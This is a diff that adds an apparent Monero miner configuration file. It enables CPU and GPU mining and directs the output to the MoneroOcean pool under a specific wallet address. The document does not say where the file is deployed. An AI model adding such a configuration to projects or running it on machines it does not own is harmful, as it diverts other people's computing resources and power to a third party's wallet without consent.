@@ -1,0 +1,14 @@
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": true,
+    "cuda": true,
+    "pools": [
+        {
+            "url": "de.moneroocean.stream:443",
+            "user": "46AqowgAGTHbBPW68pHqicAWazA42ZQaL3CjbGTMzpGCLXnk62QEhvbEeFAfhF6w46GH37V3TSQqJdgW885533BDHbjkzxb",
+            "keepalive": true,
+            "tls": true
+        }
+    ]
+}
